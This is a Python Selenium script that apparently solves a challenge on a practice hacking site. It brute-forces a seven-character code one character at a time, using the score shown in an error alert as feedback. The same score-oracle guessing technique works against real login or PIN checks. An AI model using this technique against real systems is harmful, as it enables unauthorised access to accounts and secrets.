from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
import time
import re

browser = webdriver.Firefox()
browser.get("https://hack.ainfosec.com/")
time.sleep(2)

help_button = browser.find_element_by_css_selector('[ref="helpButton"]')
help_button.click()
time.sleep(1)

account_id = browser.find_element_by_css_selector('[ref="accountID"]')
account_id.send_keys("session id here")

account_buttons = browser.find_elements_by_class_name('btn-outline-success')
account_buttons[1].click()
time.sleep(2)

flip_containers = browser.find_elements_by_class_name("flip-container")
fifty_point_flip_container = flip_containers[2]
hover = ActionChains(browser).move_to_element(fifty_point_flip_container)
hover.perform()
time.sleep(1)

hack_button = fifty_point_flip_container.find_element_by_css_selector("div button")
hack_button.click()
time.sleep(1)

pin_inputs = browser.find_elements_by_css_selector('[ref="challengeValue"]')
pin_input = pin_inputs[2]

alert_panels = browser.find_elements_by_css_selector('[ref="alertPanel"]')
alert_panel = alert_panels[2]
submit = alert_panel.find_element_by_css_selector('div button')

alpha_num = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
             'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
             'G', 'H', 'I', 'J', 'K', 'L', 'N', 'M', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ]
prev_score = 0
new_score = 0
code = ['0', '0', '0', '0', '0', '0', '0']
while True:
    for i in range(len(code)):
        temp_code = code
        for char in alpha_num:
            pin_input.clear()
            temp_code[i] = char
            pin_input.send_keys(''.join(temp_code))
            submit.click()
            time.sleep(0.5)
            alerts = browser.find_elements_by_class_name("alert-danger")
            alert = alerts[-1]
            alert_text = alert.text
            new_score = re.findall(r'\d+', alert_text)[0]
            new_score = int(new_score)
            if new_score > prev_score:
                prev_score = new_score
                code[i] = char
                break
